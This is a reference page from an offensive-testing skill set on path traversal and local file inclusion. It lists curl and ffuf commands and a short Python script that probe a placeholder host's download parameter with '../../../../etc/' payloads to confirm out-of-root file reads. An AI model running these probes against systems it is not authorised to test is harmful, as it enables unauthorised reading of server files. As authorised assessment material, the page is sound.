# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`path-traversal-and-lfi`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' "https://target.example/download?file=../../../../etc/hostname"` | Capture status and size so an out-of-root read is distinguishable from the missing-file baseline | Cross-platform |
| `ffuf` | `ffuf -u "https://target.example/download?file=FUZZ" -w traversal-ladders.txt -mc all` | Sweep depth and platform path forms to find the one that escapes the root | Cross-platform |
| `python` | `python traversal_check.py` | Compare a known file, a missing file, and an out-of-root target to confirm the channel | Cross-platform |

## Minimal Script Shape

A read-channel confirmer: it fetches a known in-root file and a guaranteed-missing file and reports whether their responses differ, which is the baseline a traversal probe must exploit.

```python
import urllib.parse
import urllib.request

BASE = "https://target.example/download"

def fetch(value):
    url = BASE + "?" + urllib.parse.urlencode({"file": value})
    req = urllib.request.Request(url, headers={"User-Agent": "authorised-assessment"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, len(r.read())
    except urllib.error.HTTPError as exc:
        return exc.code, 0

known = fetch("../../../../etc/hostname")
missing = fetch("../../../../etc/zzz-not-present")
print({"known_file": known, "missing_file": missing,
       "traversal_confirmed": known[0] == 200 and known != missing})
```
